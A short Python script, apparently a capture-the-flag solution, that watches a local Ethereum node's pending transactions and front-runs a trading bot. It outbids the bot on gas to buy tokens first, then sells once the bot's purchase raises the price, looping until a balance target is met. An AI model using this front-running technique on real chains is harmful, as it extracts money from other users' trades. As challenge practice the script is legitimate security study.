from web3 import Web3, HTTPProvider
import json
import time
web3 = Web3(HTTPProvider("http://127.0.0.1:46049")) # Replace with the actual RPC
contract_address = "0x0872694c4Bb16D5dF5fef7FE16b6B452C76231d9" # Replace with the actual contract address
wallet="0xFBf69c70f71f9a24c2765fa542e061EC51E7a991" # Replace with the actual wallet
# Setup and connect to contract
x=open('compiled_info/abi').read()
abi=eval(x)
chall = web3.eth.contract(address=contract_address,abi=abi)
balance = 0
while balance < 50:
# First, look for a transaction happening by the bot and confirm that the bot is buying token
# and not selling them, since that is not profitable for us.
    while True:
        tx = web3.geth.txpool.content()
        print(tx)
        to_break = False
        if len(tx['pending']) > 0:
            for value in tx['pending']:
                bot_wallet = value
                dict = tx['pending'][bot_wallet]
            for value in dict:
                idx = value
                payed = dict[idx]['value']
                print(str(payed))
                if int(str(payed),16)>0:
                    to_break = True
                    break
            if to_break:
                break
        else:
            time.sleep(2)

    # Buy ourselves some coins with higher gasPrice, allowing us to buy BEFORE the bot.
    num_coins=7
    price = chall.functions.priceForXFlagCoin(num_coins).call()
    print('price: '+str(price))
    gas = 80000
    gas_cost = gas * Web3.to_wei('65','gwei')
    tx_hash_1 = chall.functions.buy().transact({'from':wallet,'value':(price)+gas_cost,'gas':gas,'gasPrice':Web3.to_wei('65','gwei')})
    price = chall.functions.priceForXFlagCoin(num_coins).call()
    print('bought!')
    time.sleep(10)
    # After the bot buys, the price goes up, allowing us to get profit by selling.
    chall.functions.sell(num_coins).transact({'from':wallet,'gasPrice':Web3.to_wei('65','gwei')})
    # time.sleep(10)
    bal = web3.eth.get_balance(wallet)/(1e18)
    print('balance:' + str(bal))
    # num_coins += 2

print(chall.functions.isChallSolved().call({'from':wallet}))

